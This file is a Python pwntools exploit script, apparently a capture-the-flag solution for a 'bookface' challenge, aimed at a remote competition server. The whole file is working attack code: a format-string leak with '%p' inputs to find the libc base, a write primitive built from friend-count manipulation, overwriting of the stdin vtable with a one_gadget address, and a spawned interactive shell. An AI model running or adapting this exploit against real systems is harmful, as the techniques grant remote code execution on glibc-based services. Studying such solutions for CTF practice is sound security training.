from pwn import *
context.log_level = "debug"

random.seed(time.time())
# env = {"LD_PRELOAD":"./libc.so.6"}
# p = process(["./ld-2.23.so","./bookface"],env=env)

p = remote("pwn.2020.chall.actf.co",20733)
# context.terminal = ['/usr/bin/terminator','-x','sh', '-c']
# context.terminal = ['tmux','splitw','-h']
# p = process("./bookface")
# p = remote("localhost",8080)
# pause()
# gdb.attach(p, 'init-gef')
# gdb.attach(p)

def choice(idx):
	p.sendlineafter("> ",str(idx))

def delete(id_,name):
	p.sendlineafter(": ",str(id_))
	p.sendlineafter("? ",name)

def login(x,a,b,c,d,a1,b1,c1,d1):
	choice(4)
	p.sendlineafter(": ",str(x))
	p.sendlineafter(": ",str(a))
	p.sendlineafter(": ",str(b))
	p.sendlineafter(": ",str(c))
	p.sendlineafter(": ",str(d))
	p.sendlineafter(": ",str(a1))
	p.sendlineafter(": ",str(b1))
	p.sendlineafter(": ",str(c1))
	p.sendlineafter(": ",str(d1))


def make_friends(num):
	choice(1)
	p.sendlineafter("make? ",str(num))

def remove_friends(num):
	choice(2)
	p.sendlineafter("lose? ",str(num))

# delete(0,"asdfasdf")

# choice(4)
p.sendlineafter(": ","0")
p.sendlineafter(": ","%p")
p.sendlineafter(": ","%p")
p.sendlineafter(": ","%p")
p.sendlineafter(": ","%p")
p.recvuntil("again:\n")
data = int(p.recvline().split(".")[0],16)
# log.info(hex(data))

base = data - 0x3c56a3
log.info("Libc 0x{:x}".format(base))
randtbl = base + 0x3c40a0
log.info("RandTbl : 0x{:x}".format(randtbl))

p.sendafter(": ","10\n10\n10\n10\n")

# pause()
s = p.recvuntil("like to do?")
num_friends = int(re.findall(r"have ([0-9]+) friends",s)[0])
# print friends
remove_friends(num_friends/8)
make_friends(randtbl/8)
# pause()
login(0,1,1,1,1,1,1,1,1)

for i in range(0x10):
	make_friends(1)
	login(0,1,1,1,1,1,1,1,1)

s = p.recvuntil("like to do?")
num_friends = int(re.findall(r"have ([0-9]+) friends",s)[0])
remove_friends(num_friends/8)

stdin_vtable_addr = base + 0x3c49b8

one_gadget = base + 0xf02a4
print hex(one_gadget)
new_id = random.randint(0,2**31 - 1)
print new_id
choice(4)
p.sendlineafter("ID: ", str(new_id))
payload = p64(one_gadget)*(0xa8)
p.sendlineafter("name? ", payload)
make_friends(stdin_vtable_addr/8)
login(new_id,1,1,1,1,1,1,1,1)


p.interactive()
